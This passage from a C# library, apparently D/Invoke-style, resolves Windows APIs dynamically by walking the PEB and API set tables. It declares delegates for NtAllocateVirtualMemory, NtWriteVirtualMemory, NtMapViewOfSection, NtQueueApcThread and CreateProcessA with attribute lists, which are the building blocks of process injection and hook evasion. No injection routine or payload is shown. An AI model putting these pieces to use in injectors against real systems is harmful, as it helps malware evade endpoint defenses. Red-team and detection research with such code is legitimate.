            else if (SetEntry.ValueLength > 1)
            {
                // Loop through the hosts until we find one that is different from the key, if available
                for (var j = 0; j < SetEntry.ValueLength; j++)
                {
                    var host = (IntPtr)((ulong)pApiSetNamespace + (ulong)SetEntry.ValueOffset + (ulong)Marshal.SizeOf(SetValue) * (ulong)j);
                    if (Marshal.PtrToStringUni(host) != ApiSetEntryName)
                        pSetValue = (IntPtr)((ulong)pApiSetNamespace + (ulong)SetEntry.ValueOffset + (ulong)Marshal.SizeOf(SetValue) * (ulong)j);
                }
                // If there is not one different from the key, then just use the key and hope that works
                if (pSetValue == IntPtr.Zero)
                    pSetValue = (IntPtr)((ulong)pApiSetNamespace + (ulong)SetEntry.ValueOffset);
            }

            //Get the host DLL's name from the entry
            SetValue = (ApiSetValueEntry)Marshal.PtrToStructure(pSetValue, typeof(ApiSetValueEntry));
            var ApiSetValue = string.Empty;
            if (SetValue.ValueCount != 0)
            {
                var pValue = (IntPtr)((ulong)pApiSetNamespace + (ulong)SetValue.ValueOffset);
                ApiSetValue = Marshal.PtrToStringUni(pValue, SetValue.ValueCount / 2);
            }

            // Add pair to dict
            ApiSetDict.Add(ApiSetEntryKey, ApiSetValue);
        }

        // Return dict
        return ApiSetDict;
    }

    private static IntPtr GetPebLdrModuleEntry(string DLLName)
    {
        // Get _PEB pointer
        var pbi = NtQueryInformationProcessBasicInformation((IntPtr)(-1));

        // Set function variables
        uint LdrDataOffset = 0;
        uint InLoadOrderModuleListOffset = 0;
        if (IntPtr.Size == 4)
        {
            LdrDataOffset = 0xc;
            InLoadOrderModuleListOffset = 0xC;
        }
        else
        {
            LdrDataOffset = 0x18;
            InLoadOrderModuleListOffset = 0x10;
        }

        // Get module InLoadOrderModuleList -> _LIST_ENTRY
        var PEB_LDR_DATA = Marshal.ReadIntPtr((IntPtr)((ulong)pbi.PebBaseAddress + LdrDataOffset));
        var pInLoadOrderModuleList = (IntPtr)((ulong)PEB_LDR_DATA + InLoadOrderModuleListOffset);
        var le = (LIST_ENTRY)Marshal.PtrToStructure(pInLoadOrderModuleList, typeof(LIST_ENTRY));

        // Loop entries
        var flink = le.Flink;
        var hModule = IntPtr.Zero;
        var dte = (LDR_DATA_TABLE_ENTRY)Marshal.PtrToStructure(flink, typeof(LDR_DATA_TABLE_ENTRY));
        while (dte.InLoadOrderLinks.Flink != le.Blink)
        {
            // Match module name
            if (Marshal.PtrToStringUni(dte.FullDllName.Buffer).EndsWith(DLLName, StringComparison.OrdinalIgnoreCase))
            {
                hModule = dte.DllBase;
            }

            // Move Ptr
            flink = dte.InLoadOrderLinks.Flink;
            dte = (LDR_DATA_TABLE_ENTRY)Marshal.PtrToStructure(flink, typeof(LDR_DATA_TABLE_ENTRY));
        }

        return hModule;
    }

    public static object DynamicFunctionInvoke(IntPtr FunctionPointer, Type FunctionDelegateType, ref object[] Parameters)
    {
        var funcDelegate = Marshal.GetDelegateForFunctionPointer(FunctionPointer, FunctionDelegateType);
        return funcDelegate.DynamicInvoke(Parameters);
    }
    public static IntPtr GetLoadedModuleAddress(string DLLName)
    {
        var ProcModules = Process.GetCurrentProcess().Modules;
        foreach (ProcessModule Mod in ProcModules)
        {
            if (Mod.FileName.ToLower().EndsWith(DLLName.ToLower()))
            {
                return Mod.BaseAddress;
            }
        }
        return IntPtr.Zero;
    }

    public static void NtFreeVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, UInt32 FreeType)
    {
        // Craft an array for the arguments
        object[] funcargs =
        {
                ProcessHandle, BaseAddress, RegionSize, FreeType
                };

        NTSTATUS retValue = (NTSTATUS)DynamicAPIInvoke(@"ntdll.dll", @"NtFreeVirtualMemory", typeof(DELEGATES.NtFreeVirtualMemory), ref funcargs);
        if (retValue == NTSTATUS.AccessDenied)
        {
            // STATUS_ACCESS_DENIED
            throw new UnauthorizedAccessException("Access is denied.");
        }
        if (retValue == NTSTATUS.InvalidHandle)
        {
            // STATUS_INVALID_HANDLE
            throw new InvalidOperationException("An invalid HANDLE was specified.");
        }
        if (retValue != NTSTATUS.Success)
        {
            // STATUS_OBJECT_TYPE_MISMATCH == 0xC0000024
            throw new InvalidOperationException("There is a mismatch between the type of object that is required by the requested operation and the type of object that is specified in the request.");
        }
    }
    public struct PROCESS_BASIC_INFORMATION
    {
        public IntPtr ExitStatus;
        public IntPtr PebBaseAddress;
        public IntPtr AffinityMask;
        public IntPtr BasePriority;
        public UIntPtr UniqueProcessId;
        public int InheritedFromUniqueProcessId;

        public int Size
        {
            get { return (int)Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)); }
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PE_META_DATA
    {
        public UInt32 Pe;
        public Boolean Is32Bit;
        public IMAGE_FILE_HEADER ImageFileHeader;
        public IMAGE_OPTIONAL_HEADER32 OptHeader32;
        public IMAGE_OPTIONAL_HEADER64 OptHeader64;
        public IMAGE_SECTION_HEADER[] Sections;
    }

    public struct IMAGE_OPTIONAL_HEADER32
    {
        public UInt16 Magic;
        public Byte MajorLinkerVersion;
        public Byte MinorLinkerVersion;
        public UInt32 SizeOfCode;
        public UInt32 SizeOfInitializedData;
        public UInt32 SizeOfUninitializedData;
        public UInt32 AddressOfEntryPoint;
        public UInt32 BaseOfCode;
        public UInt32 BaseOfData;
        public UInt32 ImageBase;
        public UInt32 SectionAlignment;
        public UInt32 FileAlignment;
        public UInt16 MajorOperatingSystemVersion;
        public UInt16 MinorOperatingSystemVersion;
        public UInt16 MajorImageVersion;
        public UInt16 MinorImageVersion;
        public UInt16 MajorSubsystemVersion;
        public UInt16 MinorSubsystemVersion;
        public UInt32 Win32VersionValue;
        public UInt32 SizeOfImage;
        public UInt32 SizeOfHeaders;
        public UInt32 CheckSum;
        public UInt16 Subsystem;
        public UInt16 DllCharacteristics;
        public UInt32 SizeOfStackReserve;
        public UInt32 SizeOfStackCommit;
        public UInt32 SizeOfHeapReserve;
        public UInt32 SizeOfHeapCommit;
        public UInt32 LoaderFlags;
        public UInt32 NumberOfRvaAndSizes;

        public IMAGE_DATA_DIRECTORY ExportTable;
        public IMAGE_DATA_DIRECTORY ImportTable;
        public IMAGE_DATA_DIRECTORY ResourceTable;
        public IMAGE_DATA_DIRECTORY ExceptionTable;
        public IMAGE_DATA_DIRECTORY CertificateTable;
        public IMAGE_DATA_DIRECTORY BaseRelocationTable;
        public IMAGE_DATA_DIRECTORY Debug;
        public IMAGE_DATA_DIRECTORY Architecture;
        public IMAGE_DATA_DIRECTORY GlobalPtr;
        public IMAGE_DATA_DIRECTORY TLSTable;
        public IMAGE_DATA_DIRECTORY LoadConfigTable;
        public IMAGE_DATA_DIRECTORY BoundImport;
        public IMAGE_DATA_DIRECTORY IAT;
        public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
        public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
        public IMAGE_DATA_DIRECTORY Reserved;
    }

    [StructLayout(LayoutKind.Explicit)]
    public struct IMAGE_SECTION_HEADER
    {
        [FieldOffset(0)]
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
        public char[] Name;
        [FieldOffset(8)]
        public UInt32 VirtualSize;
        [FieldOffset(12)]
        public UInt32 VirtualAddress;
        [FieldOffset(16)]
        public UInt32 SizeOfRawData;
        [FieldOffset(20)]
        public UInt32 PointerToRawData;
        [FieldOffset(24)]
        public UInt32 PointerToRelocations;
        [FieldOffset(28)]
        public UInt32 PointerToLinenumbers;
        [FieldOffset(32)]
        public UInt16 NumberOfRelocations;
        [FieldOffset(34)]
        public UInt16 NumberOfLinenumbers;
        [FieldOffset(36)]
        public DataSectionFlags Characteristics;

        public string Section
        {
            get { return new string(Name); }
        }
    }

    [Flags]
    public enum DataSectionFlags : uint
    {
        TYPE_NO_PAD = 0x00000008,
        CNT_CODE = 0x00000020,
        CNT_INITIALIZED_DATA = 0x00000040,
        CNT_UNINITIALIZED_DATA = 0x00000080,
        LNK_INFO = 0x00000200,
        LNK_REMOVE = 0x00000800,
        LNK_COMDAT = 0x00001000,
        NO_DEFER_SPEC_EXC = 0x00004000,
        GPREL = 0x00008000,
        MEM_FARDATA = 0x00008000,
        MEM_PURGEABLE = 0x00020000,
        MEM_16BIT = 0x00020000,
        MEM_LOCKED = 0x00040000,
        MEM_PRELOAD = 0x00080000,
        ALIGN_1BYTES = 0x00100000,
        ALIGN_2BYTES = 0x00200000,
        ALIGN_4BYTES = 0x00300000,
        ALIGN_8BYTES = 0x00400000,
        ALIGN_16BYTES = 0x00500000,
        ALIGN_32BYTES = 0x00600000,
        ALIGN_64BYTES = 0x00700000,
        ALIGN_128BYTES = 0x00800000,
        ALIGN_256BYTES = 0x00900000,
        ALIGN_512BYTES = 0x00A00000,
        ALIGN_1024BYTES = 0x00B00000,
        ALIGN_2048BYTES = 0x00C00000,
        ALIGN_4096BYTES = 0x00D00000,
        ALIGN_8192BYTES = 0x00E00000,
        ALIGN_MASK = 0x00F00000,
        LNK_NRELOC_OVFL = 0x01000000,
        MEM_DISCARDABLE = 0x02000000,
        MEM_NOT_CACHED = 0x04000000,
        MEM_NOT_PAGED = 0x08000000,
        MEM_SHARED = 0x10000000,
        MEM_EXECUTE = 0x20000000,
        MEM_READ = 0x40000000,
        MEM_WRITE = 0x80000000
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_DATA_DIRECTORY
    {
        public UInt32 VirtualAddress;
        public UInt32 Size;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct IMAGE_OPTIONAL_HEADER64
    {
        public UInt16 Magic;
        public Byte MajorLinkerVersion;
        public Byte MinorLinkerVersion;
        public UInt32 SizeOfCode;
        public UInt32 SizeOfInitializedData;
        public UInt32 SizeOfUninitializedData;
        public UInt32 AddressOfEntryPoint;
        public UInt32 BaseOfCode;
        public UInt64 ImageBase;
        public UInt32 SectionAlignment;
        public UInt32 FileAlignment;
        public UInt16 MajorOperatingSystemVersion;
        public UInt16 MinorOperatingSystemVersion;
        public UInt16 MajorImageVersion;
        public UInt16 MinorImageVersion;
        public UInt16 MajorSubsystemVersion;
        public UInt16 MinorSubsystemVersion;
        public UInt32 Win32VersionValue;
        public UInt32 SizeOfImage;
        public UInt32 SizeOfHeaders;
        public UInt32 CheckSum;
        public UInt16 Subsystem;
        public UInt16 DllCharacteristics;
        public UInt64 SizeOfStackReserve;
        public UInt64 SizeOfStackCommit;
        public UInt64 SizeOfHeapReserve;
        public UInt64 SizeOfHeapCommit;
        public UInt32 LoaderFlags;
        public UInt32 NumberOfRvaAndSizes;

        public IMAGE_DATA_DIRECTORY ExportTable;
        public IMAGE_DATA_DIRECTORY ImportTable;
        public IMAGE_DATA_DIRECTORY ResourceTable;
        public IMAGE_DATA_DIRECTORY ExceptionTable;
        public IMAGE_DATA_DIRECTORY CertificateTable;
        public IMAGE_DATA_DIRECTORY BaseRelocationTable;
        public IMAGE_DATA_DIRECTORY Debug;
        public IMAGE_DATA_DIRECTORY Architecture;
        public IMAGE_DATA_DIRECTORY GlobalPtr;
        public IMAGE_DATA_DIRECTORY TLSTable;
        public IMAGE_DATA_DIRECTORY LoadConfigTable;
        public IMAGE_DATA_DIRECTORY BoundImport;
        public IMAGE_DATA_DIRECTORY IAT;
        public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
        public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
        public IMAGE_DATA_DIRECTORY Reserved;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct IMAGE_FILE_HEADER
    {
        public UInt16 Machine;
        public UInt16 NumberOfSections;
        public UInt32 TimeDateStamp;
        public UInt32 PointerToSymbolTable;
        public UInt32 NumberOfSymbols;
        public UInt16 SizeOfOptionalHeader;
        public UInt16 Characteristics;
    }

    [StructLayout(LayoutKind.Explicit)]
    public struct ApiSetNamespaceEntry
    {
        [FieldOffset(0x04)]
        public int NameOffset;

        [FieldOffset(0x08)]
        public int NameLength;

        [FieldOffset(0x10)]
        public int ValueOffset;

        [FieldOffset(0x14)]
        public int ValueLength;
    }

    [StructLayout(LayoutKind.Explicit)]
    public struct ApiSetValueEntry
    {
        [FieldOffset(0x00)]
        public int Flags;

        [FieldOffset(0x04)]
        public int NameOffset;

        [FieldOffset(0x08)]
        public int NameCount;

        [FieldOffset(0x0C)]
        public int ValueOffset;

        [FieldOffset(0x10)]
        public int ValueCount;
    }

    [StructLayout(LayoutKind.Explicit)]
    public struct ApiSetNamespace
    {
        [FieldOffset(0x0C)]
        public int Count;

        [FieldOffset(0x10)]
        public int EntryOffset;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LDR_DATA_TABLE_ENTRY
    {
        public LIST_ENTRY InLoadOrderLinks;
        public LIST_ENTRY InMemoryOrderLinks;
        public LIST_ENTRY InInitializationOrderLinks;
        public IntPtr DllBase;
        public IntPtr EntryPoint;
        public uint SizeOfImage;
        public UNICODE_STRING FullDllName;
        public UNICODE_STRING BaseDllName;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LIST_ENTRY
    {
        public IntPtr Flink;
        public IntPtr Blink;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct UNICODE_STRING
    {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }
    public enum PROCESSINFOCLASS : int
    {
        ProcessBasicInformation = 0, // 0, q: PROCESS_BASIC_INFORMATION, PROCESS_EXTENDED_BASIC_INFORMATION
        ProcessWow64Information, // q: ULONG_PTR
    }
    
    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFOEX
    {
        public STARTUPINFO StartupInfo;
        public IntPtr lpAttributeList;
    };
    
    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public ushort wShowWindow;
        public ushort cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    };

    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES
    {
        public uint nLength;
        public IntPtr lpSecurityDescriptor;
        public bool bInheritHandle;
    };

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    };
    
    [Flags]
    public enum ProcessAccessFlags : uint
    {
        
        PROCESS_ALL_ACCESS = 0x001F0FFF,
        PROCESS_CREATE_PROCESS = 0x0080,
        PROCESS_CREATE_THREAD = 0x0002,
        PROCESS_DUP_HANDLE = 0x0040,
        PROCESS_QUERY_INFORMATION = 0x0400,
        PROCESS_QUERY_LIMITED_INFORMATION = 0x1000,
        PROCESS_SET_INFORMATION = 0x0200,
        PROCESS_SET_QUOTA = 0x0100,
        PROCESS_SUSPEND_RESUME = 0x0800,
        PROCESS_TERMINATE = 0x0001,
        PROCESS_VM_OPERATION = 0x0008,
        PROCESS_VM_READ = 0x0010,
        PROCESS_VM_WRITE = 0x0020,
        SYNCHRONIZE = 0x00100000
    }

    public struct DELEGATES
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 NtOpenProcess(
                ref IntPtr ProcessHandle,
                ProcessAccessFlags DesiredAccess,
                ref OBJECT_ATTRIBUTES ObjectAttributes,
                ref CLIENT_ID ClientId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 NtProtectVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            ref IntPtr RegionSize,
            UInt32 NewProtect,
            ref UInt32 OldProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 NtFreeVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            ref IntPtr RegionSize,
            UInt32 FreeType);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 NtWriteVirtualMemory(
            IntPtr ProcessHandle,
            IntPtr BaseAddress,
            IntPtr Buffer,
            UInt32 BufferLength,
            ref UInt32 BytesWritten);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 NtAllocateVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            ref IntPtr RegionSize,
            UInt32 AllocationType,
            UInt32 Protect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate void RtlInitUnicodeString(
            ref UNICODE_STRING DestinationString,
            [MarshalAs(UnmanagedType.LPWStr)]
                        string SourceString);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate uint LdrLoadDll(
            IntPtr PathToFile,
            uint dwFlags,
            ref UNICODE_STRING ModuleFileName,
            ref IntPtr ModuleHandle);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 NtQueryInformationProcess(
            IntPtr processHandle,
            PROCESSINFOCLASS processInformationClass,
            IntPtr processInformation,
            int processInformationLength,
            ref uint returnLength);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate void RtlZeroMemory(
            IntPtr Destination,
            int length);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool InitializeProcThreadAttributeList(
            IntPtr lpAttributeList,
            int dwAttributeCount,
            int dwFlags,
            ref IntPtr lpSize);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool UpdateProcThreadAttribute(
            IntPtr lpAttributeList,
            uint dwFlags,
            IntPtr attribute,
            IntPtr lpValue,
            IntPtr cbSize,
            IntPtr lpPreviousValue,
            IntPtr lpReturnSize);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool CreateProcessA(
            string lpApplicationName,
            string lpCommandLine,
            ref SECURITY_ATTRIBUTES lpProcessAttributes,
            ref SECURITY_ATTRIBUTES lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFOEX lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate void DeleteProcThreadAttributeList(
            IntPtr lpAttributeList);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate uint NtCreateSection(
            ref IntPtr SectionHandle,
            uint DesiredAccess,
            IntPtr ObjectAttributes,
            ref ulong MaximumSize,
            uint SectionPageProtection,
            uint AllocationAttributes,
            IntPtr FileHandle);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate uint NtMapViewOfSection(
            IntPtr SectionHandle,
            IntPtr ProcessHandle,
            out IntPtr BaseAddress,
            IntPtr ZeroBits,
            IntPtr CommitSize,
            IntPtr SectionOffset,
            out ulong ViewSize,
            uint InheritDisposition,
            uint AllocationType,
            uint Win32Protect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate uint NtQueueApcThread(
            IntPtr ThreadHandle,
            IntPtr ApcRoutine,
            IntPtr ApcArgument1,
            IntPtr ApcArgument2,
            IntPtr ApcArgument3);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate uint NtResumeThread(
            IntPtr ThreadHandle,
            ref uint SuspendCount);
    }


    public enum NTSTATUS : uint
    {
        // Success
        Success = 0x00000000,
        Wait0 = 0x00000000,
        Wait1 = 0x00000001,
        Wait2 = 0x00000002,
        Wait3 = 0x00000003,
        Wait63 = 0x0000003f,
        Abandoned = 0x00000080,
        AbandonedWait0 = 0x00000080,
        AbandonedWait1 = 0x00000081,
        AbandonedWait2 = 0x00000082,
        AbandonedWait3 = 0x00000083,
        AbandonedWait63 = 0x000000bf,
        UserApc = 0x000000c0,
        KernelApc = 0x00000100,
        Alerted = 0x00000101,
        Timeout = 0x00000102,
        Pending = 0x00000103,
        Reparse = 0x00000104,
        MoreEntries = 0x00000105,
        NotAllAssigned = 0x00000106,
        SomeNotMapped = 0x00000107,
        OpLockBreakInProgress = 0x00000108,
        VolumeMounted = 0x00000109,
        RxActCommitted = 0x0000010a,
        NotifyCleanup = 0x0000010b,
        NotifyEnumDir = 0x0000010c,
        NoQuotasForAccount = 0x0000010d,
        PrimaryTransportConnectFailed = 0x0000010e,
        PageFaultTransition = 0x00000110,
        PageFaultDemandZero = 0x00000111,
        PageFaultCopyOnWrite = 0x00000112,
        PageFaultGuardPage = 0x00000113,
        PageFaultPagingFile = 0x00000114,
        CrashDump = 0x00000116,
        ReparseObject = 0x00000118,
        NothingToTerminate = 0x00000122,
        ProcessNotInJob = 0x00000123,
        ProcessInJob = 0x00000124,
        ProcessCloned = 0x00000129,
        FileLockedWithOnlyReaders = 0x0000012a,
        FileLockedWithWriters = 0x0000012b,

        // Informational
        Informational = 0x40000000,
        ObjectNameExists = 0x40000000,
        ThreadWasSuspended = 0x40000001,
        WorkingSetLimitRange = 0x40000002,
        ImageNotAtBase = 0x40000003,
        RegistryRecovered = 0x40000009,

        // Warning
        Warning = 0x80000000,
        GuardPageViolation = 0x80000001,
        DatatypeMisalignment = 0x80000002,
        Breakpoint = 0x80000003,
        SingleStep = 0x80000004,
        BufferOverflow = 0x80000005,
        NoMoreFiles = 0x80000006,
        HandlesClosed = 0x8000000a,
        PartialCopy = 0x8000000d,
        DeviceBusy = 0x80000011,
        InvalidEaName = 0x80000013,
        EaListInconsistent = 0x80000014,
        NoMoreEntries = 0x8000001a,
        LongJump = 0x80000026,
        DllMightBeInsecure = 0x8000002b,

        // Error
        Error = 0xc0000000,
        Unsuccessful = 0xc0000001,
        NotImplemented = 0xc0000002,
        InvalidInfoClass = 0xc0000003,
        InfoLengthMismatch = 0xc0000004,
        AccessViolation = 0xc0000005,
        InPageError = 0xc0000006,
        PagefileQuota = 0xc0000007,
        InvalidHandle = 0xc0000008,
        BadInitialStack = 0xc0000009,
        BadInitialPc = 0xc000000a,
        InvalidCid = 0xc000000b,
        TimerNotCanceled = 0xc000000c,
        InvalidParameter = 0xc000000d,
        NoSuchDevice = 0xc000000e,
        NoSuchFile = 0xc000000f,
        InvalidDeviceRequest = 0xc0000010,
        EndOfFile = 0xc0000011,
        WrongVolume = 0xc0000012,
        NoMediaInDevice = 0xc0000013,
        NoMemory = 0xc0000017,
        ConflictingAddresses = 0xc0000018,
        NotMappedView = 0xc0000019,
        UnableToFreeVm = 0xc000001a,
        UnableToDeleteSection = 0xc000001b,
        IllegalInstruction = 0xc000001d,
        AlreadyCommitted = 0xc0000021,
        AccessDenied = 0xc0000022,
        BufferTooSmall = 0xc0000023,
        ObjectTypeMismatch = 0xc0000024,
        NonContinuableException = 0xc0000025,
        BadStack = 0xc0000028,
        NotLocked = 0xc000002a,
        NotCommitted = 0xc000002d,
        InvalidParameterMix = 0xc0000030,
        ObjectNameInvalid = 0xc0000033,
        ObjectNameNotFound = 0xc0000034,
        ObjectNameCollision = 0xc0000035,
        ObjectPathInvalid = 0xc0000039,
        ObjectPathNotFound = 0xc000003a,
        ObjectPathSyntaxBad = 0xc000003b,
        DataOverrun = 0xc000003c,
        DataLate = 0xc000003d,
        DataError = 0xc000003e,
        CrcError = 0xc000003f,
        SectionTooBig = 0xc0000040,
        PortConnectionRefused = 0xc0000041,
        InvalidPortHandle = 0xc0000042,
        SharingViolation = 0xc0000043,
        QuotaExceeded = 0xc0000044,
        InvalidPageProtection = 0xc0000045,
        MutantNotOwned = 0xc0000046,
        SemaphoreLimitExceeded = 0xc0000047,
        PortAlreadySet = 0xc0000048,
        SectionNotImage = 0xc0000049,
        SuspendCountExceeded = 0xc000004a,
        ThreadIsTerminating = 0xc000004b,
        BadWorkingSetLimit = 0xc000004c,
        IncompatibleFileMap = 0xc000004d,
        SectionProtection = 0xc000004e,
        EasNotSupported = 0xc000004f,
        EaTooLarge = 0xc0000050,
        NonExistentEaEntry = 0xc0000051,
        NoEasOnFile = 0xc0000052,
        EaCorruptError = 0xc0000053,
        FileLockConflict = 0xc0000054,
        LockNotGranted = 0xc0000055,
        DeletePending = 0xc0000056,
        CtlFileNotSupported = 0xc0000057,
        UnknownRevision = 0xc0000058,
        RevisionMismatch = 0xc0000059,
        InvalidOwner = 0xc000005a,
        InvalidPrimaryGroup = 0xc000005b,
        NoImpersonationToken = 0xc000005c,
        CantDisableMandatory = 0xc000005d,
        NoLogonServers = 0xc000005e,
        NoSuchLogonSession = 0xc000005f,
        NoSuchPrivilege = 0xc0000060,
        PrivilegeNotHeld = 0xc0000061,
        InvalidAccountName = 0xc0000062,
        UserExists = 0xc0000063,
        NoSuchUser = 0xc0000064,
        GroupExists = 0xc0000065,
        NoSuchGroup = 0xc0000066,
        MemberInGroup = 0xc0000067,
        MemberNotInGroup = 0xc0000068,
        LastAdmin = 0xc0000069,
        WrongPassword = 0xc000006a,
        IllFormedPassword = 0xc000006b,
        PasswordRestriction = 0xc000006c,
        LogonFailure = 0xc000006d,
        AccountRestriction = 0xc000006e,
        InvalidLogonHours = 0xc000006f,
        InvalidWorkstation = 0xc0000070,
        PasswordExpired = 0xc0000071,
        AccountDisabled = 0xc0000072,
        NoneMapped = 0xc0000073,
        TooManyLuidsRequested = 0xc0000074,
        LuidsExhausted = 0xc0000075,
        InvalidSubAuthority = 0xc0000076,
        InvalidAcl = 0xc0000077,
        InvalidSid = 0xc0000078,
        InvalidSecurityDescr = 0xc0000079,
        ProcedureNotFound = 0xc000007a,
        InvalidImageFormat = 0xc000007b,
        NoToken = 0xc000007c,
        BadInheritanceAcl = 0xc000007d,
        RangeNotLocked = 0xc000007e,
        DiskFull = 0xc000007f,
        ServerDisabled = 0xc0000080,
        ServerNotDisabled = 0xc0000081,
        TooManyGuidsRequested = 0xc0000082,
        GuidsExhausted = 0xc0000083,
        InvalidIdAuthority = 0xc0000084,
        AgentsExhausted = 0xc0000085,
        InvalidVolumeLabel = 0xc0000086,
        SectionNotExtended = 0xc0000087,
        NotMappedData = 0xc0000088,
        ResourceDataNotFound = 0xc0000089,
        ResourceTypeNotFound = 0xc000008a,
        ResourceNameNotFound = 0xc000008b,
        ArrayBoundsExceeded = 0xc000008c,
        FloatDenormalOperand = 0xc000008d,
        FloatDivideByZero = 0xc000008e,
        FloatInexactResult = 0xc000008f,
        FloatInvalidOperation = 0xc0000090,
        FloatOverflow = 0xc0000091,
        FloatStackCheck = 0xc0000092,
        FloatUnderflow = 0xc0000093,
        IntegerDivideByZero = 0xc0000094,
        IntegerOverflow = 0xc0000095,
        PrivilegedInstruction = 0xc0000096,
        TooManyPagingFiles = 0xc0000097,
        FileInvalid = 0xc0000098,
        InsufficientResources = 0xc000009a,
        InstanceNotAvailable = 0xc00000ab,
        PipeNotAvailable = 0xc00000ac,
        InvalidPipeState = 0xc00000ad,
        PipeBusy = 0xc00000ae,
        IllegalFunction = 0xc00000af,
        PipeDisconnected = 0xc00000b0,
        PipeClosing = 0xc00000b1,
        PipeConnected = 0xc00000b2,
        PipeListening = 0xc00000b3,
        InvalidReadMode = 0xc00000b4,
        IoTimeout = 0xc00000b5,
        FileForcedClosed = 0xc00000b6,
        ProfilingNotStarted = 0xc00000b7,
        ProfilingNotStopped = 0xc00000b8,
        NotSameDevice = 0xc00000d4,
        FileRenamed = 0xc00000d5,
        CantWait = 0xc00000d8,
        PipeEmpty = 0xc00000d9,
        CantTerminateSelf = 0xc00000db,
        InternalError = 0xc00000e5,
        InvalidParameter1 = 0xc00000ef,
        InvalidParameter2 = 0xc00000f0,
        InvalidParameter3 = 0xc00000f1,
        InvalidParameter4 = 0xc00000f2,
        InvalidParameter5 = 0xc00000f3,
        InvalidParameter6 = 0xc00000f4,
        InvalidParameter7 = 0xc00000f5,
        InvalidParameter8 = 0xc00000f6,
        InvalidParameter9 = 0xc00000f7,
        InvalidParameter10 = 0xc00000f8,
        InvalidParameter11 = 0xc00000f9,
        InvalidParameter12 = 0xc00000fa,
        ProcessIsTerminating = 0xc000010a,
        MappedFileSizeZero = 0xc000011e,
        TooManyOpenedFiles = 0xc000011f,
        Cancelled = 0xc0000120,
        CannotDelete = 0xc0000121,
        InvalidComputerName = 0xc0000122,
        FileDeleted = 0xc0000123,
        SpecialAccount = 0xc0000124,
        SpecialGroup = 0xc0000125,
        SpecialUser = 0xc0000126,
        MembersPrimaryGroup = 0xc0000127,
        FileClosed = 0xc0000128,
        TooManyThreads = 0xc0000129,
        ThreadNotInProcess = 0xc000012a,
        TokenAlreadyInUse = 0xc000012b,
        PagefileQuotaExceeded = 0xc000012c,
        CommitmentLimit = 0xc000012d,
        InvalidImageLeFormat = 0xc000012e,
        InvalidImageNotMz = 0xc000012f,
        InvalidImageProtect = 0xc0000130,
        InvalidImageWin16 = 0xc0000131,
        LogonServer = 0xc0000132,
        DifferenceAtDc = 0xc0000133,
        SynchronizationRequired = 0xc0000134,
        DllNotFound = 0xc0000135,
        IoPrivilegeFailed = 0xc0000137,
        OrdinalNotFound = 0xc0000138,
        EntryPointNotFound = 0xc0000139,
        ControlCExit = 0xc000013a,
        InvalidAddress = 0xc0000141,
        PortNotSet = 0xc0000353,
        DebuggerInactive = 0xc0000354,
        CallbackBypass = 0xc0000503,
        PortClosed = 0xc0000700,
        MessageLost = 0xc0000701,
        InvalidMessage = 0xc0000702,
        RequestCanceled = 0xc0000703,
        RecursiveDispatch = 0xc0000704,
        LpcReceiveBufferExpected = 0xc0000705,
        LpcInvalidConnectionUsage = 0xc0000706,
        LpcRequestsNotAllowed = 0xc0000707,
        ResourceInUse = 0xc0000708,
        ProcessIsProtected = 0xc0000712,
        VolumeDirty = 0xc0000806,
        FileCheckedOut = 0xc0000901,
